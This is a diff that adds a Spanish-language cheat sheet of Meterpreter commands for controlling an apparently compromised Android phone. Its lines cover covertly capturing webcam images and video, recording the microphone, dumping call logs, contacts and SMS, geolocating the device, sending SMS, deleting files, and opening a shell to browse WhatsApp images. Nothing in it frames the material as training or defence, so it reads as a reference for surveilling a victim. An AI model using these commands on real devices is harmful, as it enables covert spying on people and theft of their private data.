@@ -1,0 +1,30 @@
+COMANDOS METERPRETER
+meterpreter > pwd — Ubicacion actual directorio
+meterpreter > cd cache — Cache
+meterpreter > cat — Para ver archivos
+meterpreter > ls — Listar archivos
+meterpreter > upload <archivo> — Subir archivo
+meterpreter > download <archivo> — Descargar archivo
+meterpreter > ifconfig — Detalle configuracion redes
+meterpreter > ps — Lista procesos
+meterpreter > sysinfo — Informacion de sistema
+meterpreter > webcam_list — Listado de webcam
+meterpreter > webcam_snap -i 2 — Capturar imagen de camara 2
+meterpreter > webcam_stream -l 2 — Streaming video de camara 2
+meterpreter > record_mic -d 20 — Grabar 20s de audio
+meterpreter > dump_calllog — Obtener registro de llamadas
+meterpreter > dump_contacts — Obtener registro de contactos
+meterpreter > geolocate — Obtener ubicacion del telefono
+meterpreter > send_sms -d <num> -t text — Enviar SMS (deja huellas)
+meterpreter > dump_sms — Ver los sms recibidos
+meterpreter > route_list — Ruteo de direcciones
+meterpreter > cd /sdcard — Lista archivos de SD Card
+meterpreter > rm <archivo> — Eliminar archivo
+meterpreter > rmdir <carpeta> — Eliminar carpeta
+meterpreter > mkdir <dir> — Crear carpeta
+meterpreter > search -f *.mp3 — Buscar archivos extension mp3
+meterpreter > set_audio_mode -m 0 — 0:Silencio 1:Medio 2:Maximo
+meterpreter > shell — Ejecutar una shell
+> cd /sdcard
+> cd WhatsApp\ Images
+> exit — Finaliza la shell
